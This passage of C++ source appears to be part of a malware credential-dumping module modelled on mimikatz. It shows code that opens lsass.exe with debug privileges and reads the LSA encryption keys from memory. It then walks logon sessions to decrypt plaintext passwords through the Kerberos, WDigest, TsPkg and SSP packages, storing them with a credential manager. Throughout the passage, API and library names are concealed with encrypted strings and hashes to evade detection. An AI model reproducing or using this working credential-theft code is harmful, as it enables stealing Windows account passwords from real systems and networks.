					LONG OFFS_WNT6_AdjustProvider = (pContext->GLOB_Version.dwBuildNumber < 8000) ? 5 : 4;
					PBYTE	InitializationVector = reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
					pContext->hAesKey = reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
					pContext->h3DesKey = reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase - OFFS_WNT6_h3DesKey_m) + sizeof(long) + *reinterpret_cast<long *>(ptrBase - OFFS_WNT6_h3DesKey_m));
					pContext->hAesProvider = reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider - sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider - sizeof(long)));
					pContext->h3DesProvider = reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase - OFFS_WNT6_h3DesKey_m - 3 - OFFS_WNT6_AdjustProvider - sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase - OFFS_WNT6_h3DesKey_m - 3 - OFFS_WNT6_AdjustProvider - sizeof(long)));
#elif defined _M_IX86
					PBYTE	InitializationVector = *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
					pContext->hAesKey = *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
					pContext->h3DesKey = *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase - OFFS_WNT6_h3DesKey_m);
					pContext->hAesProvider = *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_hAesKey + sizeof(PVOID) + 2);
					pContext->h3DesProvider = *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase - OFFS_WNT6_h3DesKey_m + sizeof(PVOID) + 2);
#endif

					if (lpLsaInitializeProtectedMemory_NT6(pContext))
					{
						mesSucces = 0;
						if (lp_readMemory(pContext->pModLSASRV->modBaseAddr + (InitializationVector - addrMonModule), InitializationVector, 16, pContext->hLSASS)) {
							mesSucces++;
							DbgPrint("ok1");
						}

						KIWI_BCRYPT_KEY maCle;
						KIWI_BCRYPT_KEY_DATA maCleData;

						if (lp_readMemory(pContext->pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(pContext->hAesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), pContext->hLSASS))
							if (lp_readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), pContext->hLSASS))
								if (lp_readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), pContext->hLSASS))
									if (lp_readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*pContext->hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2 * sizeof(PVOID), pContext->hLSASS)) { // 2 pointeurs internes à la fin, la structure de départ n'était pas inutile ;)
										mesSucces++;
										DbgPrint("ok2");
									}

						if (lp_readMemory(pContext->pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(pContext->h3DesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), pContext->hLSASS))
							if (lp_readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), pContext->hLSASS))
								if (lp_readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), pContext->hLSASS))
									if (lp_readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*pContext->h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), pContext->hLSASS)) {
										mesSucces++;
										DbgPrint("ok3");
									}
					} else { DbgPrint("ERR: LsaInitializeProtectedMemory NT6 init failed");  }
				} else { DbgPrint("ERR:mod_memory::searchMemory NT6 error %04Xh", GetLastError()); }
				bRes = (mesSucces == 3);
			}
		}
	

	return bRes;
}

// query host's os version
BOOL lpGetVersion(OSVERSIONINFOEX * maVersion)
{
	memset(maVersion, 0, sizeof(OSVERSIONINFOEX));
	maVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	return (GetVersionEx(reinterpret_cast<LPOSVERSIONINFO>(maVersion)) != 0);
}

// loads bcrypt or lsasrv according to host os version
BOOL lploadLsaSrv(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszS;	// decrypt string buffer

	if ((pContext->GLOB_Version.dwMajorVersion > 5) && (!pContext->hBCrypt)) {
		wszS = CRSTRW("bcrypt", "\xfe\x9f\xd5\x06\xf8\x9f\xd7\x0d\xfc\x9e\x25\xfa\x9b\xb0\x32");
		pContext->hBCrypt = LoadLibrary(wszS);
		my_free(wszS);
	}	// bcrypt load

	if (!pContext->hLsaSrv) {
		wszS = CRSTRW("lsasrv", "\xfc\x7f\x08\x03\xfa\x7f\x04\x18\xed\x74\xfa\xfd\xbb\x0a\x28");
		pContext->hLsaSrv = LoadLibrary(wszS);
		my_free(wszS);
	} // lsasrv load

	return (pContext->hLsaSrv != NULL);
}

BOOL lploadRsaEnh(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszS;	// decrypt string buffer

	if (!pContext->hRsaEng) {
		wszS = CRSTRW("rsaenh", "\xff\xdf\x27\x0a\xf9\xdf\x35\x11\xee\xc2\xc9\xea\x33\x64\xc3");
		pContext->hRsaEng = LoadLibrary(wszS);
		my_free(wszS);
	} // rsaenh load

	return (pContext->hRsaEng != NULL);
}

/*
	Check against a pre-defined list of non-interested records
*/
#define BST_RND_XOR STRHASH_PARAM(0x2f0bea89756149f4)
BOOL isBadStringToken(LSA_UNICODE_STRING usString)
{
	BOOL bRes = FALSE;	// func result
	SIZE_T lLen = 0;
	LPWSTR wszBuf = NULL;	// tmp internal buffer
	UINT64 i64Hash;	// input string's hash

	// check for too small len
	if (!usString.Buffer || !usString.Length || !usString.MaximumLength) { /*DbgPrint("WARN: empty string passed");*/ return bRes; }
	if (IsBadReadPtr(usString.Buffer, usString.MaximumLength)) { /*DbgPrint("WARN: bad read ptr");*/ return bRes; }

	// copy to a new buffer
	if (!(wszBuf = (LPWSTR)my_alloc(usString.MaximumLength * 3))) { DbgPrint("WARN: failed to alloc mem"); return bRes; }
	lstrcpynW(wszBuf, usString.Buffer, (usString.Length + 1) * 2);

	// make lowercase before hashing
	sr_lowercase(wszBuf);

	i64Hash = HashStringW_const(wszBuf) ^ BST_RND_XOR;

	// check against pre-defined values
	switch (i64Hash) {

	case HASHSTR_CONST("local service", 0x1803f238a88094c2) ^ BST_RND_XOR:
	case HASHSTR_CONST("network service", 0x5e1aef90c53377f4) ^ BST_RND_XOR:
	case HASHSTR_CONST("nt authority", 0x21c7f17ddc7975ab) ^ BST_RND_XOR:
		bRes = TRUE;

	} // switch

	// bogus account consisting of machine name with $ on the end. Just check for $ in string's end
	// NOTE: UNICODE_STRING's lengths are in bytes, not chars
	if (*(WORD*)((SIZE_T)wszBuf + (usString.Length - 2) ) == '$') { bRes = TRUE; }

	// free mem used
	my_free(wszBuf);

	return bRes;
}

/*
	Called by sec_pkg analyzers when password is detected.
	Username & domain passed by sec_pkg module may be swapped, so use bIsDomainUsernameSwapped flag
*/
void lpgenericCredsToStream(LP_MODULE_CONTEXT *pContext, PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, BOOL bIsDomainUsernameSwapped)
{
	LPWSTR userName = NULL;
	LPWSTR domainName = NULL;

	if (mesCreds)
	{
		if (mesCreds->Password.Buffer /*|| mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer*/)
		{
			if (!bIsDomainUsernameSwapped) {
				userName = lp_getUnicodeStringOfProcess(&mesCreds->UserName, pContext->hLSASS);
				domainName = lp_getUnicodeStringOfProcess(&mesCreds->Domaine, pContext->hLSASS);
			} else {
				domainName = lp_getUnicodeStringOfProcess(&mesCreds->UserName, pContext->hLSASS);
				userName = lp_getUnicodeStringOfProcess(&mesCreds->Domaine, pContext->hLSASS);
			}

			// calling this on some internal account may lead to execution problems
			// even in original code. Need to investigate more
			LPWSTR password = lp_getUnicodeStringOfProcess(&mesCreds->Password, pContext->hLSASS, pContext->SeckPkgFunctionTable->LsaUnprotectMemory);

			// check for ok decrypt
			if (password) {

				// NB: string in pContext are UNICODE_STRINGS, which may have no terminating null character. So it is essential
				// to parse it correctly before sending to creds manager

				DbgPrint("OK: pkg[%ws] user[%ws] pass[%ws] domain[%ws]", pContext->wszPackageName, userName, password, domainName);

				ADD_CREDS_RECORD acr = { 0 };
				FILETIME ftNow = cmftNow();
				acr.coOrigin = CRED_ORIGIN_LOCAL;
				acr.dwLen = sizeof(ADD_CREDS_RECORD);
				acr.ftGathered = ftNow;
				acr.ftReceived = ftNow;
				acr.wszDomain = domainName;			// maybe lp_getUnicodeStringOfProcess() here
				acr.wszUsername = userName;		// maybe lp_getUnicodeStringOfProcess() here
				acr.wszPassword = password;
				if (cmAddCredentials(&acr)) { DbgPrint("cmAddCredentials() ok"); } else { DbgPrint("WARN: cmAddCredentials() failed"); }

			} //else { DbgPrint("WARN: nothing to show"); }

			// free buffers allocated by lp_getUnicodeStringOfProcess
			if (password) { my_free(password); }
			if (domainName) { my_free(domainName); }
			if (userName) { my_free(userName); }

		}
		//else { DbgPrint("fail, some buffers not defined"); }

	} //else { DbgPrint("LUID fail"); }
}

/*
	Placeholder for entering module
	Dumps lsass's passwords
	Returns specific error result (or OK result in passed wResultCode)
*/
BOOL lpDumpLogonPasswords(WORD *wResultCode, DWORD *dwLastError)
{
	BOOL bRes = FALSE;	// function result
	DWORD dwLSASS_EXE_PID = 0;	// pid of lsass.exe process
	LP_MODULE_CONTEXT Context = { 0 };	// context with all vars shared between functions

	// for enuming via Lsa* functions
	PLUID sessions;
	ULONG count;

	// for loading secur32 funcs
	HMODULE hSecur32;
	LPWSTR wszS;
	LPSTR szS;
	// removed from direct import
	fnLsaGetLogonSessionData pLsaGetLogonSessionData;
	fnLsaEnumerateLogonSessions pLsaEnumerateLogonSessions;
	fnLsaFreeReturnBuffer pLsaFreeReturnBuffer;

	DbgPrint("entered");

	// initiate errors result
	if (!wResultCode || !dwLastError) { DbgPrint("ERR: no result buffers specified, exiting"); return bRes; }
	*wResultCode = LPR_UNSPECIFIED_ERROR;
	*dwLastError = 0;

	// in order to operate, host process needs debug privileges
	if (!lpGetDebugPrivileges()) { DbgPrint("ERR: failed to get debug privileges"); *wResultCode = LPR_NO_DEBUG_PRIVILEGES; return bRes; }

	// perform other essential initialization
	if (!lpGetVersion(&Context.GLOB_Version)) { DbgPrint("ERR: failed to get os version"); *wResultCode = LPR_GET_OS_VERSION_FAIL; return bRes; }
	if (!lploadLsaSrv(&Context)) { DbgPrint("ERR: failed to load lsasrv.dll"); *wResultCode = LPR_LSASRV_LOAD_FAILED; return bRes; }
	if (!lploadRsaEnh(&Context)) { DbgPrint("ERR: failed to load rsaenh.dll"); *wResultCode = LPR_RSAENH_LOAD_FAILED; return bRes; }

	// get pid of lsass.exe
	if (!(dwLSASS_EXE_PID = _lpGetPIDByHash(HASHSTR_CONST("lsass.exe", 0x71d1effbbde1f5f6)))) { DbgPrint("ERR: failed to get pid of lsass process"); *wResultCode = LPR_LSASS_GETPID_FAILED; return bRes; }
	DbgPrint("lsass pid = %u", dwLSASS_EXE_PID);

	// open process for mem read
	if (!(Context.hLSASS = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, dwLSASS_EXE_PID))) { *wResultCode = LPR_LSASS_OPEN_FAILED; *dwLastError = GetLastError(); DbgPrint("ERR: failed to open lsass for read %04Xh", *dwLastError); return bRes; }

	// query handles of auth package modules inside of lsass
	DbgPrint("reading lsass modules info");
	if (!lpReadLSASSModulesInfo(&Context)) { DbgPrint("ERR: failed to lpReadLSASSModulesInfo()"); *wResultCode = LPR_LSASS_GETMODULES_FAILED; return bRes; }

	// read encryption keys from lsass memory
	DbgPrint("reading encryption keys info");
	if (!lpReadLSASSEncryptionKeys(&Context)) { DbgPrint("ERR: failed to lpReadLSASSEncryptionKeys()"); *wResultCode = LPR_LSASS_READ_KEYS_FAILED; return bRes; }

	// call init for local module's contexts, due to no stdlib, it should be done manually
	DbgPrint("performing sec_pkg modules init");
	kerb_InitGlobals();
	ts_InitGlobals();
	wdig_InitGlobals();
	ssp_InitGlobals();
	lssp_InitGlobals();

	// get some secur32 imports
	wszS = CRSTRW("secur32", "\x00\xc0\xa1\x0f\x07\xc0\xb2\x02\x13\xcd\x53\xb4\xa2\x9b\x1e");
	hSecur32 = LoadLibrary(wszS);
	my_free(wszS);
	if (!hSecur32) { DbgPrint("ERR: failed to load secur32"); *wResultCode = LPR_SECUR32_LOAD_FAILED; return bRes; }

	szS = CRSTRA("LsaGetLogonSessionData", "\x00\xa0\xc8\x0f\x16\xa0\xe4\x14\x11\x9f\x2d\xf3\xdc\x57\x0f\xc8\xde\x4b\x6d\xb4\xa3\x11\x47\x89\xb4\x39\xbc\x66\xcd\x34\xa2");
	pLsaGetLogonSessionData = (fnLsaGetLogonSessionData)GetProcAddress(hSecur32, szS);
	my_free(szS);

	szS = CRSTRA("LsaEnumerateLogonSessions", "\x00\x80\xef\x0c\x19\x80\xc3\x17\x11\xbd\x01\xf1\xfd\x7d\x3d\xc5\xc4\x5d\x63\xab\xb7\x37\x61\xb7\x95\x0b\x9c\x6d\x7f\xf6\xbc");
	pLsaEnumerateLogonSessions = (fnLsaEnumerateLogonSessions)GetProcAddress(hSecur32, szS);
	my_free(szS);

	szS = CRSTRA("LsaFreeReturnBuffer", "\x00\xc0\x6b\x0e\x13\xc0\x47\x15\x11\xfe\x99\xe3\xf5\x0a\xae\xd2\xc5\x0a\xc5\x84\xa5\x7e\xed\x83\x82\x1a\x19");
	pLsaFreeReturnBuffer = (fnLsaFreeReturnBuffer)GetProcAddress(hSecur32, szS);
	my_free(szS);

	if (!pLsaGetLogonSessionData || !pLsaEnumerateLogonSessions || !pLsaFreeReturnBuffer) { DbgPrint("ERR: failed loading secur32 imports"); *wResultCode = LPR_SECUR32_IMPORT_RESOLVE_FAILED; return bRes; }

	// cycle logon data and query available info
	DbgPrint("performing enum");
	if (NT_SUCCESS(pLsaEnumerateLogonSessions(&count, &sessions))) {

		DbgPrint("got %u items to process", count);

		for (ULONG i = 0; i < count; i++) {

			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if (NT_SUCCESS(pLsaGetLogonSessionData(&sessions[i], &sessionData))) {

				if (sessionData->LogonType != Network) {

					// check for not needed users 
					if ((!isBadStringToken(sessionData->UserName)) && (!isBadStringToken(sessionData->LogonDomain))) {

						//DbgPrint("auth_id[%u;%u] pkg[%ws] user[%ws] domain[%ws]", sessions[i].HighPart, sessions[i].LowPart, sessionData->AuthenticationPackage.Buffer, sessionData->UserName.Buffer, sessionData->LogonDomain.Buffer);

						// set username & domain to context, so it may be used by cred adder routines
						Context.usDomain = &sessionData->LogonDomain;
						Context.usUsername = &sessionData->UserName;

						// call all modules passing &sessions[i] as param
						getKerberosLogonData(&Context, &sessions[i]);
						getTsPkgLogonData(&Context, &sessions[i]);
						getWDigestLogonData(&Context, &sessions[i]);
						getSSPLogonData(&Context, &sessions[i]);
						getLiveSSPLogonData(&Context, &sessions[i]);

						// if got here, assume OK execution
						*wResultCode = LPR_DONE_OK;
						bRes = TRUE;

					} // !isBadStringToken()

				} // ! network logon
				pLsaFreeReturnBuffer(sessionData);

			} else { *wResultCode = LPR_LSAGETLOGONSESSIONDATA_FAILED; *dwLastError = GetLastError(); DbgPrint("ERR: LsaGetLogonSessionData() fail %04Xh", *dwLastError); }

		} // for

		pLsaFreeReturnBuffer(sessions);
	} else { *wResultCode = LPR_LSA_ENUMERATELOGONSESSIONS_FAILED; *dwLastError = GetLastError(); DbgPrint("ERR: LsaEnumerateLogonSessions() fail %04Xh", *dwLastError); }

	DbgPrint("all done");

	return bRes;
}